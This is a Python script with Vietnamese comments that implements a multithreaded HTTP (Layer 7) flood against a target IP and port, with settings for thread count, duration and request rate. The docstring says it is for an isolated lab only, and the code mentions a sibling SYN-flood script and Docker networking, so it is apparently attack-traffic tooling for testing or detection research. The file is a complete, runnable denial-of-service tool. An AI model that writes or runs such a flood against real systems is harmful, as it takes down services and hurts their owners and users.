#!/usr/bin/env python3
"""HTTP Flood (L7) - chi dung trong lab co lap."""
import sys, time, argparse, threading, urllib.request

stop = False
count = 0
lock = threading.Lock()

def worker(url, interval):
    global count
    while not stop:
        t0 = time.perf_counter()
        try:
            urllib.request.urlopen(url, timeout=2).read()
            with lock:
                count += 1
        except Exception:
            pass
        if interval:
            # pacing: moi thread giu nhip 'interval' giua cac request -> tong ~--pps req/s
            dt = time.perf_counter() - t0
            if dt < interval:
                time.sleep(interval - dt)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target")                       # IP victim
    ap.add_argument("-p", "--port", type=int, default=80)
    ap.add_argument("-t", "--threads", type=int, default=20)
    ap.add_argument("-d", "--duration", type=int, default=30, help="giay")
    ap.add_argument("--pps", type=int, default=0,
                    help="gioi han REQUEST/giay tong (0=khong gioi han); mirror syn_flood.py de "
                         "pace ve dai pps thuc te, tranh chuc nghin pps phi thuc te cua bridge Docker")
    args = ap.parse_args()

    url = "http://%s:%d/" % (args.target, args.port)
    # pacing deu tren cac thread: moi thread nhip = threads/pps giay (tong ~--pps req/s)
    interval = (args.threads / args.pps) if args.pps > 0 else 0.0
    print("[*] HTTP flood -> %s | threads=%d | %ds | pps=%s" % (
        url, args.threads, args.duration, args.pps or "max"))

    ths = [threading.Thread(target=worker, args=(url, interval), daemon=True) for _ in range(args.threads)]
    for t in ths: t.start()

    global stop
    time.sleep(args.duration)
    stop = True
    time.sleep(1)
    print("[*] done, tong request thanh cong: %d (~%.0f req/s)" % (count, count/args.duration))

if __name__ == "__main__":
    main()
